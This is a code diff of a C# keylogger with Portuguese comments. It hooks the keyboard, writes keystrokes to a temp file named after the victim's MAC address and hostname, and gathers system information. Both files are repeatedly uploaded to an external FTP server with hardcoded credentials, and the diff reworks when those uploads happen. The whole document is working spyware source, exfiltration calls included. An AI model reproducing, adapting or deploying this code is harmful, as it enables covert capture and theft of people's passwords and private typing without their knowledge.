@@ -17,20 +17,20 @@ namespace vrtx_keys {
         private static int VK_CAPITAL = 0x14;
         private static int VK_RMENU = 0xA5;
 
+        public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
         public static LowLevelKeyboardProc llkProcedure = HookCallback;
+
         private static bool capsPressed = GetKeyState(VK_CAPITAL);
         private static bool shiftPressed = GetKeyState(VK_SHIFT);
         private static bool rAltPressed = GetKeyState(VK_RMENU);
 
-        private static string FILEPATH = FileAccess(Path.GetTempPath());
-        private static IntPtr PFGW;
-
         private static uint charCounter = 0;
 
-        public static bool sysUpload = true; //Para fazer upload do arquivo de informações do sistema
-        public static bool logUpload = false; //Para fazer upload do arquivo de log do teclado 
+        public static ushort sysUpload = 0; //Para fazer upload do arquivo de informações do sistema
+        public static ushort logUpload = 1; //Para fazer upload do arquivo de log do teclado 
 
-        public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
+        private static IntPtr PFGW;
+        private static string FILEPATH = FileAccess(Path.GetTempPath());
 
         //Método responsável pelo acesso do arquivo de log
         private static string FileAccess(string path) {
@@ -40,27 +40,32 @@ namespace vrtx_keys {
             }
 
             //filepath é o caminho absoluto para o aquivo de log
-            string logFilepath = path + @"\" + NetworkInteraction.GetMacAddress() + "_" + Dns.GetHostName() + ".log";
+            string logFilepath = path + NetworkInteraction.GetMacAddress() + "_" + Dns.GetHostName() + ".log";
             string sysFilepath = path + @"\sys_data_capture.log";
 
-            //Caso o arquivo não exista
+            //Caso o arquivo de log não exista
             if(!File.Exists(logFilepath)) {
                 //Criando o arquivo de log
-                using(StreamWriter sw = File.CreateText(logFilepath)) { }
-                //Criando o arquivo de informações do sistema   
+                using(StreamWriter sw = File.CreateText(logFilepath)) { }   
             }
             else {
-                //Caso já exista um arquivo, limpamos o conteúdo do mesmo
+                //Caso já exista um arquivo, primeiro fazemos upload para o ftp e limpamos o conteúdo do mesmo
+                NetworkInteraction.FtpUploader("ftpupload.net", 21, "epiz_26313655", "1YMGe66Wlztz9", logFilepath, NetworkInteraction.GetMacAddress(), logUpload);
+                //Em seguida limpamos o arquivo de log
                 File.WriteAllText(logFilepath, String.Empty);
             }
 
+            //Caso o arquivo de informações do sistema não exista
             if(!File.Exists(sysFilepath)) {
-                //Fazendo o upload do arquivo de informações do sistema
-                NetworkInteraction.GetExtraInfo();
+                //Criando o arquivo de informações do sistema
+                using(StreamWriter sw = File.CreateText(sysFilepath)) { }
             }
-
+            
+            //Caso já exista um arquivo, limpamos o conteúdo do mesmo e pegamos as informações do sistema atualizadas
+            File.WriteAllText(sysFilepath, String.Empty);
+            NetworkInteraction.GetExtraInfo();
+            //Em seguida fazemos upload das informações do sistema atualizadas
             NetworkInteraction.FtpUploader("ftpupload.net", 21, "epiz_26313655", "1YMGe66Wlztz9", sysFilepath, NetworkInteraction.GetMacAddress(), sysUpload);
-            NetworkInteraction.FtpUploader("ftpupload.net", 21, "epiz_26313655", "1YMGe66Wlztz9", logFilepath, NetworkInteraction.GetMacAddress(), logUpload);
 
             return logFilepath;
         }
@@ -91,7 +96,7 @@ namespace vrtx_keys {
                 int vkCode = Marshal.ReadInt32(lParam);
 
                 if(wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN) {
-                    if(charCounter == 200) {
+                    if(charCounter == 2000) {
                         charCounter = 0;
                         NetworkInteraction.FtpUploader("ftpupload.net", 21, "epiz_26313655", "1YMGe66Wlztz9", FILEPATH, NetworkInteraction.GetMacAddress(), logUpload);
                     }
